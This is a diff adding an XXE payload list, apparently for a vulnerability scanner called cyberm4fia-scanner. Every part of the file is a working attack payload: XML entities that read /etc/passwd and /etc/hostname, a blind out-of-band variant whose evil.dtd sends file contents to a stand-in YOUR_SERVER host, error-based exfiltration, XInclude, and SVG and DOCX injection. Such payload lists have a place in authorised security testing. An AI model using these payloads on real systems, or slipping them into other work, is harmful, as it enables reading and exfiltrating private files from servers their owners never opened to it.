@@ -1,0 +1,33 @@
+# XXE Payloads — cyberm4fia-scanner
+# Categories: File Read, Blind OOB, Error-Based, XInclude, SVG
+
+# ─── Basic File Read ───
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<test>&xxe;</test>
+
+# ─── Blind XXE via OOB (parameter entity) ───
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR_SERVER/evil.dtd"> %xxe;]>
+<test></test>
+# evil.dtd:
+# <!ENTITY % file SYSTEM "file:///etc/passwd">
+# <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_SERVER/?=%file;'>">
+# %eval; %exfiltrate;
+
+# ─── Error-Based Exfiltration ───
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///null/%file;'>">
+%eval; %error;
+
+# ─── XInclude ───
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>
+
+# ─── SVG XXE ───
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+<svg xmlns="http://www.w3.org/2000/svg">
+<text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+# ─── XXE via DOCX/XLSX ───
+# Modify [Content_Types].xml inside the zip:
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
